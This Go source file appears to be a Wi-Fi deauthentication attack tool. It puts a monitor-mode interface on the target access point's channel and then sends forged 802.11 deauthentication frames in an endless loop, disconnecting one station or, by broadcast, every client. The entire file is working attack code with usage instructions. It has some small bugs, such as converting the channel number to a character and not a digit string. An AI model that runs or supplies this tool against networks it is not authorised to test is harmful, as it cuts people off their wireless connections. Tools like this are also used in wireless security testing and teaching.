package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	handle *pcap.Handle
	err    error

	channel     int8 = 0
	station_mac string
	iface       string
)

func main() {
	// argv //////////////////////////////////////////////////////////////////////////////
	if len(os.Args) < 3 {
		fmt.Println("syntax : ./deauth-attack <interface> <ap mac> [<station mac>]")
		fmt.Println("sample : ./deauth-attack mon0 00:11:22:33:44:55")
		fmt.Println("sample : ./deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB")
		os.Exit(1)
	}

	iface := os.Args[1]
	ap_mac := os.Args[2]
	station_mac = "ff:ff:ff:ff:ff:ff"
	if len(os.Args) == 4 {
		station_mac = os.Args[3]
	}
	//////////////////////////////////////////////////////////////////////////////////////

	// pcap handler //////////////////////////////////////////////////////////////////////
	handle, err = pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()
	//////////////////////////////////////////////////////////////////////////////////////

	// find channel & parse packet ///////////////////////////////////////////////////////
	go channel_hopping()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		_dot11 := packet.Layer(layers.LayerTypeDot11)
		if _dot11 == nil {
			continue
		}
		dot11, _ := _dot11.(*layers.Dot11)

		_dot11info := packet.Layer(layers.LayerTypeDot11InformationElement)
		if _dot11info == nil {
			continue
		}

		ap, _ := net.ParseMAC(ap_mac)
		if ap.String() == dot11.Address2.String() {
			channel = int8(packet.Layers()[5].LayerContents()[2])
			fmt.Println(channel)
			break
		}
	}
	//////////////////////////////////////////////////////////////////////////////////////

	// change channel ////////////////////////////////////////////////////////////////////
	exec.Command("iwconfig", iface, "channel", string(channel)).Start()
	//////////////////////////////////////////////////////////////////////////////////////

	// make packet ///////////////////////////////////////////////////////////////////////
	rawBytes := []byte{0, 0, 12, 0, 4, 128, 0, 0, 2, 0, 24, 0, 192, 0, 58, 1}
	for _, num := range trans_string_to_int(station_mac) {
		rawBytes = append(rawBytes, byte(num))
	}
	for i := 0; i < 2; i++ {
		for _, num := range trans_string_to_int(ap_mac) {
			rawBytes = append(rawBytes, byte(num))
		}
	}
	rawBytes = append(rawBytes, 192, 7, 7, 0)
	//////////////////////////////////////////////////////////////////////////////////////

	// send packet ///////////////////////////////////////////////////////////////////////
	for {
		err = handle.WritePacketData(rawBytes)
		if err != nil {
			log.Fatal(err)
		}
		time.Sleep(time.Second / 2)
	}
	//////////////////////////////////////////////////////////////////////////////////////
}

// "ff:ff:ff:ff:ff:ff" => 255 255 255 255 255 255 ////////////////////////////////////////
func trans_string_to_int(str string) []byte {
	arr := []byte{}
	for i := 0; i <= 15; i += 3 {
		num, _ := strconv.ParseInt(str[i:i+2], 16, 16)
		arr = append(arr, byte(num))
	}
	return arr
}

//////////////////////////////////////////////////////////////////////////////////////////

func channel_hopping() {
	a := []string{"1", "7", "13", "2", "8", "3", "9", "4", "10", "5", "11", "6", "12"}

	for {
		for _, j := range a {
			exec.Command("iwconfig", "mon0", "channel", j).Start()
			time.Sleep(time.Second * 1)
			if channel != 0 {
				break
			}
		}
		if channel != 0 {
			break
		}
	}
}
